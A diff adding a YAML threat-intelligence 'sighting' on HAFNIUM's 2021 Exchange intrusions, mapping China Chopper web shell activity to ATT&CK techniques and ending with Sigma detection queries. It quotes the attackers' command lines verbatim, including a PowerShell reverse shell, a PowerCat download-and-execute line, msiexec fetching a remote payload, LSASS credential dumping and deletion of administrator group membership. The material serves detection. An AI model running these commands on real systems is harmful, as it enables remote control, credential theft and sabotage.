@@ -1,0 +1,544 @@
+---
+header:
+  sightingReportId: 59d13fe2-d9bd-4372-aae4-5e3215980fe2
+  status: wip
+  description: This Threat Sighting for HAFNIUM delivers a few TTPs based on avaialble public reports. HAFNIUM targeted Exchange Servers with 0-day exploits back in March 2021. HAFNIUM leveraged China Chopper webshell.
+  author: Alejandro Houspanossian (@lekz86)
+  acknowledgement: Eoin Miller (RAPID7)
+  tlp: white
+  threatInformation:
+    adversaries:
+    - HAFNIUM
+    tools:
+    - procdump
+    - powershell
+    - nltest
+    - china chopper
+    - cishang
+    - powercat
+    malware:
+    - n/d
+    lolbas:
+    - cmd
+    - regsvr32
+    - net
+threatSightings:
+  - sighting: Initial Access - Threat actor used exploits against _Internet Information Services (IIS)_ and _Microsoft Exchange Server_ to install _China Chopper Web Shells_ for Persistence.
+    id: a2600957-3e2b-4dc2-9398-df7d9bec6ee9
+    behaviors:
+    - behavior: Internet Information Services (IIS) Worker Process -_w3wp.exe_- drops Web Shells to IIS aspnet_client folder.
+      id: b74fe3b2-15a2-4526-9b15-493e6197583e
+      type: File Created
+      weapon: w3wp
+      files:
+        - name: web.aspx
+          path: C:\\inetpub\\wwwroot\\aspnet_client\\
+          process: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        - name: help.aspx
+          path: C:\\inetpub\\wwwroot\\aspnet_client\\
+          process: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        - name: document.aspx
+          path: C:\\inetpub\\wwwroot\\aspnet_client\\
+          process: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        - name: errorEE.aspx
+          path: C:\\inetpub\\wwwroot\\aspnet_client\\
+          process: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+      notes:
+      - If execution is on an x86 architecture, the process will be _C:\\Windows\\SysWOW64\\inetsrv\\w3wp.exe_.
+      - Common file types for web shells are _.aspx_, _.asp_ and _.js_.
+      att&ck:
+        persistence:
+        - "T1505.003 - Server Software Component: Web Shell"
+        initialAccess:
+        - "T1190 - Exploit Public-Facing Application"
+    - behavior: _w3wp.exe_ drops files into IIS system_web folder.
+      id: aed25763-af9b-4e37-9ace-d08dd3705f58
+      type: File Created
+      weapon: w3wp
+      files:
+        - name: errorEW.aspx
+          path: C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\
+          process: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        - name: errorFF.aspx
+          path: C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\
+          process: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        - name: healthcheck.aspx
+          path: C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\
+          process: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        - name: aspnet_www.aspx
+          path: C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\
+          process: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+      att&ck:
+        persistence:
+        - "T1505.003 - Server Software Component: Web Shell"
+        initialAccess:
+        - "T1190 - Exploit Public-Facing Application"
+    - behavior: _w3wp.exe_ drops files into  _Microsoft Exchange Server ecp auth_ folder.
+      id: 1d14b92c-7291-4481-86da-d20e413993a0
+      type: File Created
+      weapon: w3wp
+      files:
+        - name: web.aspx
+          path: C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\ecp\\auth\\
+          process: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        - name: help.aspx
+          path: C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\ecp\\auth\\
+          process: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        - name: document.aspx
+          path: C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\ecp\\auth\\
+          process: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        - name: errorEE.aspx
+          path: C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\ecp\\auth\\
+          process: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+      att&ck:
+        persistence:
+        - "T1505.003 - Server Software Component: Web Shell"
+        initialAccess:
+        - "T1190 - Exploit Public-Facing Application"
+    - behavior: _w3wp.exe_ drops files into _Microsoft Exchange Server owa auth_ folder.
+      id: 2621dd55-3025-4a0c-8442-2f4d30665e16
+      type: File Created
+      weapon: w3wp
+      files:
+        - name: web.aspx
+          path: C:\\Program Files\\Microsoft\\Exchange Server\\V15\\HttpProxy\\owa\\auth\\
+          process: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        - name: help.aspx
+          path: C:\\Program Files\\Microsoft\\Exchange Server\\V15\\HttpProxy\\owa\\auth\\
+          process: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        - name: document.aspx
+          path: C:\\Program Files\\Microsoft\\Exchange Server\\V15\\HttpProxy\\owa\\auth\\
+          process: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+      att&ck:
+        persistence:
+        - "T1505.003 - Server Software Component: Web Shell"
+        initialAccess:
+        - "T1190 - Exploit Public-Facing Application"
+    - behavior: _w3wp.exe_  drops files into _Microsoft Exchange Server FrontEnd owa auth_ folder.
+      id: 5ffcf0da-07df-45c7-9eba-37039798637d
+      type: File Created
+      weapon: w3wp
+      files:
+        - name: web.aspx
+          path: C:\\Exchange\\FrontEnd\\HttpProxy\\owa\\auth\\
+          process: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        - name: help.aspx
+          path: C:\\Exchange\\FrontEnd\\HttpProxy\\owa\\auth\\
+          process: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        - name: document.aspx
+          path: C:\\Exchange\\FrontEnd\\HttpProxy\\owa\\auth\\
+          process: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+      att&ck:
+        persistence:
+        - "T1505.003 - Server Software Component: Web Shell"
+        initialAccess:
+        - "T1190 - Exploit Public-Facing Application"
+  - sighting: Persistence - Threat Actor used _nltest, net and other basic commands via China Chopper Web Shell_ for Discovery.
+    id: 2597fe43-eb31-486c-871e-7a9df1fb1018
+    behaviors:
+    - behavior: _w3wp_ spawns _CMD_.
+      type: Process Created
+      id: 1239de88-cbbe-43bc-bfcc-90f9108b41e8
+      weapon: chinachopper
+      processes:
+      - parentProcess: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        process: C:\\Windows\\System32\\cmd.exe
+        cmdLine:
+        - '/c cd /d C:\\inetpub\\wwwroot\\&query user&echo [S]&cd&echo [E]'
+        - '/c cd /d C:\\inetpub\\wwwroot\\&hostname&echo [S]&cd&echo [E]'
+        - '/c cd /d C:\\inetpub\\wwwroot\\&ping #{dst} -n 1&echo [S]&cd&echo [E]'
+        - '/c cd /d C:\\inetpub\\wwwroot\\&tasklist\|findstr dll&echo [S]&cd&echo [E]'
+        - 'cd /d "c:\inetpub\wwwroot\"&whoami&echo [S]&cd&echo [E]'
+        - 'cmd /c cd /d c:\\temp&tasklist&echo [S]&cd&echo [E]'
+        - 'cmd /c cd /d E:\\logs&tasklist &echo [S]&cd&echo [E]'
+      att&ck:
+        persistence:
+        - "T1505.003 - Server Software Component: Web Shell"
+    - behavior: _CMD_ spawns discovery commands (_query.exe_, _hostname.exe_, _ping.exe_, _tasklist.exe_, _whoami.exe_).
+      type: Process Created
+      id: d319de88-cbbe-43bc-bfcc-90f9108b41e8
+      weapon: cmd
+      processes:
+      - parentProcess: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        process: C:\\Windows\\System32\\cmd.exe
+        cmdLine:
+        - 'query user'
+        - 'hostname'
+        - 'ping #{dst} -n 1'
+        - 'tasklist\|findstr dll'
+        - 'whoami'
+        - 'tasklist'
+      att&ck:
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+        discovery:
+        - "T1049 - System Network Connections Discovery"
+        - "T1082 - System Information Discovery"
+    - behavior: _CMD_ spawns _nltest.exe_ and _net.exe_ commands.
+      id: c3350a0b-1b5c-495c-b382-a8a36aed3080
+      type: Process Created
+      weapon: cmd
+      processes:
+      - parentProcess: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        process: C:\\Windows\\System32\\cmd.exe
+        cmdLine:
+        - nltest /dclist:#{DOMAIN}
+        - whoami
+        - net group \"Domain computers\" /do
+      att&ck:
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+        discovery:
+        - "T1069 - Permission Groups Discovery: Domain Groups"
+        - "T1482 - Domain Trust Discovery"
+  - sighting: Persistence - Threat Actor used _wmic via China Chopper Web Shell_ to list running processes for Discovery.
+    id: 4567fe43-eb31-486c-871e-7a9df1fb1058
+    behaviors:
+    - behavior: _w3wp_ spawns _CMD_ commands for execution of _WMIC_ commands.
+      id: 7894af42-38c1-4599-9afb-30f919919f19
+      weapon: chinachopper
+      processes:
+      - parentProcess: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        process: C:\\Windows\\System32\\cmd.exe
+        cmdLine:
+        - cmd /c cd /d C:\\inetpub\\wwwroot\\aspnet_client\\system_web&wmic process where name=smex_master.exe get ExecutablePath,commandline&echo [S]&cd&echo [E]
+        - cmd /c cd /d C:\\inetpub\\wwwroot\\aspnet_client\\system_web&wmic process where name=unsecapp.exe get ExecutablePath&echo [S]&cd&echo [E]
+        - cmd /c cd /d C:\\inetpub\\wwwroot\\aspnet_client\\system_web&wmic process where name=unsecapp.exe get processid&echo [S]&cd&echo [E]
+      type: Process Created
+      att&ck:
+        persistence:
+        - "T1505.003 - Server Software Component: Web Shell"
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+    - behavior: _CMD_ spawns _wmic.exe_ discovery commands.
+      id: 5164af42-38c1-4599-9afb-30f919919f1e
+      weapon: wmic
+      processes:
+      - parentProcess: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        process: C:\\Windows\\System32\\cmd.exe
+        cmdLine:
+        - wmic process where name=smex_master.exe get ExecutablePath,commandline
+        - wmic process where name=unsecapp.exe get ExecutablePath
+        - wmic process where name=unsecapp.exe get processid
+      type: Process Created
+      att&ck:
+        execution:
+        - "T1047 - Windows Management Instrumentation"
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+        discovery:
+        - "T1057 - Process Discovery"
+  - sighting: Persistence - Threat Actor used _Procdump64 via China Chopper Web Shell_ for Credential Access.
+    id: 98a84597-f3a4-4045-ba14-bafeacccee99
+    behaviors:
+    - behavior: _w3wp_ spawns _CMD_ to execute _Procdump64_.
+      id: 548f14bc-5b94-4dd9-97ef-65d6f275b1b4
+      type: Process Created
+      weapon: w3wp
+      processes:
+      - parentProcess: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        process: C:\\Windows\\System32\\cmd.exe
+        cmdLine:
+          - 'cmd /c cd /d C:\\root&procdump64.exe -accepteula -ma lsass.exe lsass.dmp&echo [S]&cd&echo [E]'
+          - 'cmd /c cd /d E:\\logs&procdump64.exe -accepteula -ma lsass.exe lsass.dmp&echo [S]&cd&echo [E]'
+      att&ck:
+        persistence:
+        - "T1505.003 - Server Software Component: Web Shell"
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+    - behavior: _CMD_ spawns _Procdump64_
+      id: 123f14bc-5b94-4dd9-97ef-65d6f275b1b4
+      type: Process Created
+      weapon: procdump64
+      processes:
+      - parentProcess: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        process: C:\\Windows\\System32\\cmd.exe
+        cmdLine:
+          - 'procdump64.exe -accepteula -ma lsass.exe lsass.dmp'
+          - 'procdump64.exe -accepteula -ma lsass.exe lsass.dmp'
+      att&ck:
+        credentialAccess:
+        - "T1003.001 - OS Credential Dumping: LSASS Memory"
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+  - sighting: Persistence - Threat Actor used _PowerShell_ to stablish additional C2 channels for Command And Control.
+    id: 959f7703-6bbd-4f50-a4fd-fa8d92fb8e82
+    behaviors:
+    - behavior: _w3wp_ spawns _PowerShell_
+      id: 123c2414-d7a0-4fcb-a8e6-d37fb29ab422
+      type: Process Created
+      weapon: w3wp
+      processes:
+      - parentProcess: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        process: C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe
+        cmdLine:
+        - powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(IP, PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+        - "IEX (New-Object System.Net.Webclient).DownloadString('https://raw[.]githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c REDACTED -p REDACTED -e powershell"
+      att&ck:
+        execution:
+        - "T1059.001 - Command and Scripting Interpreter: PowerShell"
+        persistence:
+        - "T1505.003 - Server Software Component: Web Shell"
+    - behavior: _PowerShell_ executes Nishang Invoke-PowerShellTcpOneLine reverse shell.
+      id: b6fc2414-d7a0-4fcb-a8e6-d37fb29ab425
+      type: Process Created
+      weapon: pwsh/nishang
+      processes:
+      - parentProcess: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        process: C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe
+        cmdLine:
+        - powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(IP, PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+      att&ck:
+        execution:
+        - "T1059.001 - Command and Scripting Interpreter: PowerShell"
+        commandAndControl:
+        - "T1095 - Non-Application Layer Protocol"
+    - behavior: Attempted to download and execute PowerCat to connect to a remote server
+      id: b43cf2e3-7e03-44c6-aca4-111be19434c1
+      type: Process Created
+      weapon: powercat
+      processes:
+      - parentProcess: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        process: C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe
+        cmdLine:
+          - "IEX (New-Object System.Net.Webclient).DownloadString('https://raw[.]githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c REDACTED -p REDACTED -e powershell"
+      att&ck:
+        execution:
+        - "T1059.001 - Command and Scripting Interpreter: PowerShell"
+        commandAndControl:
+        - "T1071.001 - Application Layer Protocol: Web Protocols"
+  - sighting: Persistence - Threat Actor used _MSIEXEC via China Chopper Web Shell_ to execute web payload for Command And Control.
+    id: 56c885ef-d250-47e6-8f69-fccd2fed982f
+    behaviors:
+    - behavior: _w3wp_ spawns _MSIEXEC_
+      id: b1f6fc99-dd19-47f5-ae66-ad8081a081a6
+      type: Process Created
+      weapon: w3wp
+      processes:
+      - parentProcess: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        process: C:\\Windows\\System32\\cmd.exe
+        cmdLine:
+        - 'cmd /c cd /d C:\\inetpub\\wwwroot\\aspnet_client&msiexec /q /i http://103[.]212.223.210:9900/nvidia.msi&echo [S]&cd&echo [E]'
+      att&ck:
+        persistence:
+        - "T1505.003 - Server Software Component: Web Shell"
+        execution:
+        - "T1218.007 - Signed Binary Proxy Execution: Msiexec"
+    - behavior: _MSIEXEC_ fetches and executes web payload.
+      id: 1236fc99-dd19-47f5-ae66-ad8081a081a6
+      type: Process Created
+      weapon: msiexec
+      processes:
+      - parentProcess: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        process: C:\\Windows\\System32\\cmd.exe
+        cmdLine:
+        - 'msiexec /q /i http://103[.]212.223.210:9900/nvidia.msi'
+      att&ck:
+        commandAndControl:
+        - "T1071.001 - Application Layer Protocol: Web Protocols"
+        - "T1105 - Ingress Tool Transfer"
+        execution:
+        - "T1218.007 - Signed Binary Proxy Execution: Msiexec"
+  - sighting: Persistence - Threat Actor used _CMD del commands via China Chopper Web Shell_ to delete Web Shell files for Defense Evasion.
+    id: 78db09fb-0878-460d-b209-25c3efa784f9
+    behaviors:
+    - behavior: _w3wp_ spawns _CMD_ to run delete commands.
+      id: 12340e66-da38-4cf0-9b50-1ef662bd1de3
+      type: Process Created
+      weapon: doscmd/del
+      processes:
+      - parentProcess: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        process: C:\\Windows\\System32\\cmd.exe
+        cmdLine:
+        - "cmd /c cd /d C:/inetpub/wwwroot/aspnet_client&del 'E:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\OutlookEN.aspx'&echo [S]"
+        - "cmd /c cd /d C:/inetpub/wwwroot/aspnet_client&del 'E:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\TimeoutLogout.aspx'&echo [S]"
+      att&ck:
+        persistence:
+        - "T1505.003 - Server Software Component: Web Shell"
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+    - behavior: _CMD_ executes _del_ commands.
+      id: 56060e66-da38-4cf0-9b50-1ef662bd1def
+      type: Process Created
+      weapon: doscmd/del
+      processes:
+      - parentProcess: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        process: C:\\Windows\\System32\\cmd.exe
+        cmdLine:
+        - "del 'E:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\OutlookEN.aspx"
+        - "del 'E:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\TimeoutLogout.aspx"
+      att&ck:
+        defenseEvasion:
+        - "T1070.004 - Indicator Removal on Host: File Deletion"
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+  - sighting: Persistence - Threat Actor used _net group del commands via China Chopper Web Shell_ to deleted Active Directory groups for Impact.
+    id: 3c4be675-291d-4f4d-a084-5c025696a0b8
+    behaviors:
+    - behavior: _w3wp_ spawns _CMD_
+      id: 12369d06-597d-49e8-9be1-ce51eda42c0a
+      type: Process Created
+      weapon: w3wp
+      processes:
+      - parentProcess: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        process: C:\\Windows\\System32\\cmd.exe
+        cmdLine:
+          - 'cmd /c cd /d C:\\inetpub\\wwwroot\\aspnet_client\\system_web&net group "Exchange Organization administrators" administrator /del /domain&echo [S]&cd&echo [E]'
+      att&ck:
+        persistence:
+        - "T1505.003 - Server Software Component: Web Shell"
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+    - behavior: _CMD_ runs _net.exe_ commands.
+      id: 1fd69d06-597d-49e8-9be1-ce51edb42c0a
+      type: Process Created
+      weapon: net
+      processes:
+      - parentProcess: C:\\Windows\\System32\\inetsrv\\w3wp.exe
+        process: C:\\Windows\\System32\\cmd.exe
+        cmdLine:
+          - 'net group \"Exchange Organization administrators\" administrator /del /domain'
+      att&ck:
+        impact:
+        - "T1531 - Account Access Removal"
+threatHunting:
+  - query: Hunt for webshell installation
+    queryId: 1780b811-c592-4b50-b441-2659531cc87f
+    type: sigma
+    behaviorIds:
+    - b74fe3b2-15a2-4526-9b15-493e6197583e
+    - aed25763-af9b-4e37-9ace-d08dd3705f58
+    logsource:
+      category: file_creation
+      product: windows
+    detection:
+        selection:
+            ParentImage\|endswith:
+              - '\UMWorkerProcess.exe' #Microsoft Exchange Unified Messaging Worker Process
+              - '\w3wp.exe' # Internet Information Services (IIS) Worker Process
+        selection2:
+            FileName\|endswith:
+              - ".aspx"
+              - ".asp"
+              - ".js"
+        selection3:
+            FilePath\|contains:
+              - '\\AppData\\Local\\Temp\\Temporary ASP.NET Files'
+              - '\\inetpub\wwwroot\\aspnet_client\\'
+              - 'C:\\ProgramData\\'
+            FilePath\|re: '\\Microsoft.NET\\Framework64\\*\\Temporary ASP.NET Files'
+            FilePath\|re: '\\Microsoft\\Exchange Server\\V*\\FrontEnd\\HttpProxy\\owa\\auth\\'
+            FilePath\|re: '\\Program Files\\Microsoft\\Exchange Server\\V*\\FrontEnd\\HttpProxy\\OAB\\'
+        condition: all of them
+  - query: Hunt for arbitrary code execution from webshell
+    queryId: 6c90b274-e7b8-4d68-b266-28ea817a9982
+    type: sigma
+    behaviorIds:
+    - d319de88-cbbe-43bc-bfcc-90f9108b41e8
+    logsource:
+        category: process_creation
+        product: windows
+    detection:
+        selection:
+            ParentImage\|endswith:
+              - '\\UMWorkerProcess.exe' #Microsoft Exchange Unified Messaging Worker Process
+              - '\\w3wp.exe' # Internet Information Services (IIS) Worker Process
+        selection2:
+            Image\|contains:
+              - powershell
+              - wscript
+              - cscript
+              - regsvr32
+              - cmd
+              - mshta
+              # - rundll32 seems to be common
+        condition: all of them
+  - query: Hunt for arbitrary code execution via ChinaChopper webshell
+    queryId: 701bc87e-8242-4bb7-a4f8-de4ac4fb02a7
+    type: sigma
+    behaviorIds:
+    - d319de88-cbbe-43bc-bfcc-90f9108b41e8
+    - 548f14bc-5b94-4dd9-97ef-65d6f275b1b4
+    - c3350a0b-1b5c-495c-b382-a8a36aed3080
+    - 5164af42-38c1-4599-9afb-30f919919f1e
+    logsource:
+        category: process_creation
+        product: windows
+    detection:
+        selection:
+            ParentImage\|endswith:
+              - '\\UMWorkerProcess.exe' #Microsoft Exchange Unified Messaging Worker Process
+              - '\\w3wp.exe' # Internet Information Services (IIS) Worker Process
+        selection2:
+            CommandLine\|contains: '&echo [S]&cd&echo [E]'
+        condition: all of them
+  - query: Hunt for PowerCat execution
+    queryId: f14c7639-4d77-4218-9b80-a93e1fea6cf1
+    type: sigma
+    behaviorIds:
+    - b43cf2e3-7e03-44c6-aca4-111be19434c1
+    logsource:
+        category: process_creation
+        product: windows
+    detection:
+        selection:
+            CommandLine\|re: 'IEX (New-Object System.Net.Webclient).DownloadString*powercat.ps1*'
+            CommandLine\|re: 'IEX * powercat -c*'
+        condition: all of them
+  - query: Hunt for Nishang reverse shell execution
+    queryId: d7c5389f-5d03-4186-b142-394200ec1ef2
+    type: sigma
+    behaviorIds:
+    - b6fc2414-d7a0-4fcb-a8e6-d37fb29ab425
+    logsource:
+        category: process_creation
+        product: windows
+    detection:
+        selection:
+            CommandLine\|contains\|all:
+              - 'powershell -nop -c'
+              - 'TCPClient'
+              - 'sendback'
+        condition: all of them
+  - query: Hunt for Discovery commands
+    queryId: 0491846e-8377-49bb-9a39-18eca7f7006f
+    type: sigma
+    behaviorIds:
+    - d319de88-cbbe-43bc-bfcc-90f9108b41e8
+    logsource:
+        category: process_creation
+        product: windows
+    detection:
+        selection:
+            ParentImage\|endswith:
+              - '\\MWorkerProcess.exe' #Microsoft Exchange Unified Messaging Worker Process
+              - '\\w3wp.exe' # Internet Information Services (IIS) Worker Process
+        selectionDiscovery1:
+            Image\|endswith:
+               - '\\net.exe'
+               - '\\net1.exe'
+               - '\\nbtstat.exe'
+               - '\netstat.exe'
+               - '\\hostname.exe'
+               - '\\systeminfo.exe'
+               - '\\whoami.exe'
+               - '\\tasklist.exe'
+        selectionDiscovery2:
+            CommandLine\|re: 'cmd*net*'
+            CommandLine\|re: 'cmd*nbtstat'
+            CommandLine\|re: 'cmd*netstat*'
+            CommandLine\|re: 'cmd*hostname*'
+            CommandLine\|re: 'cmd*systeminfo*'
+            CommandLine\|re: 'cmd*whoami*'
+            CommandLine\|re: 'cmd*tasklist*'
+        condition: selection AND (selectionDiscovery1 OR selectionDiscovery2)
+footer:
+  changeTracking:
+    created: 2021-06-15
+    lastModified: 2022-03-22
+    sightingVersion: 1.10
+    schemaVersion: 1.7
+  references:
+    - https://www.rapid7.com/blog/post/2021/03/23/defending-against-the-zero-day-analyzing-attacker-behavior-post-exploitation-of-microsoft-exchange/
+    - https://www.fireeye.com/blog/threat-research/2021/03/detection-response-to-exploitation-of-microsoft-exchange-zero-day-vulnerabilities.html
+    - https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/
+    - https://www.microsoft.com/security/blog/2020/02/04/ghost-in-the-shell-investigating-web-shell-attacks/
